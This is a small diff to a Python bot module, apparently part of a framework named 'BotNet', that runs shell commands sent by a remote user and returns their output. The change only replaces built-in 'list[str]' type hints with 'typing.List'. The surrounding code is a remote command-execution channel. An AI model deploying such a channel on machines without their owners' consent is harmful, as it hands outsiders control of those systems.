@@ -2,7 +2,7 @@ import os
 import time
 import threading
 import subprocess
-
+from typing import List
 
 from .. import BotNet, Context
 
@@ -81,7 +81,7 @@ def _valid_command(command) -> bool:
     return True
 
 
-def _cd(command: list[str]) -> str:
+def _cd(command: List[str]) -> str:
     if len(command) >= 2:
         path = command[1]
     else:
@@ -97,7 +97,7 @@ def _cd(command: list[str]) -> str:
         return error
 
 
-def __runcommand_in_thread(command: list[str], engine, timeout: int = 6) -> None:
+def __runcommand_in_thread(command: List[str], engine, timeout: int = 6) -> None:
     """Run commands in thread"""
 
     # override command cd
@@ -118,7 +118,7 @@ def __runcommand_in_thread(command: list[str], engine, timeout: int = 6) -> None
         return "Your command is running in the background and you will get the results when it is done."
 
 
-def _runcommand(command: list[str], engine):
+def _runcommand(command: List[str], engine):
     """run command by subprocess.getstatusoutput
     and send resaults by engine.send method"""
 
